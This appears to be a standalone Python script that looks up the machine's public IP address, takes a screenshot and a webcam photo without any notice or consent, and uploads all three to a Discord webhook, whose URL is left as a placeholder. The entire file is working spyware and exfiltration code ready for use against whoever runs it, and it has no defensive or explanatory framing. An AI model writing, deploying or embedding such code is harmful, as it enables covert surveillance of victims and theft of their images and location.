import pyautogui
import cv2
import requests

def send_to_discord(ip, images):
    files = []
    for i, image in enumerate(images):
        files.append(("image_" + str(i) + ".png", ("image_" + str(i) + ".png", open(image, "rb"), "image/png")))
    payload = {"content": f"Current IP Address: {ip}"}
    requests.post("enter your webhook", 
                  data=payload, files=files)

def get_ip_address():
    response = requests.get("https://api.ipify.org/")
    return response.text

def take_screenshot():
    image = pyautogui.screenshot()
    image.save("screenshot.png")
    return "screenshot.png"

def take_webcam_picture():
    cap = cv2.VideoCapture(0)
    ret, frame = cap.read()
    if ret:
        cv2.imwrite("webcam_picture.png", frame)
        cap.release()
        return "webcam_picture.png"
    else:
        print("Failed to capture image from webcam.")
        cap.release()
        return None

ip = get_ip_address()

# Uncomment one of the following lines to take either a screenshot or a picture from a webcam:
images = [take_screenshot(), take_webcam_picture()]
images = [image for image in images if image is not None]

send_to_discord(ip, images)
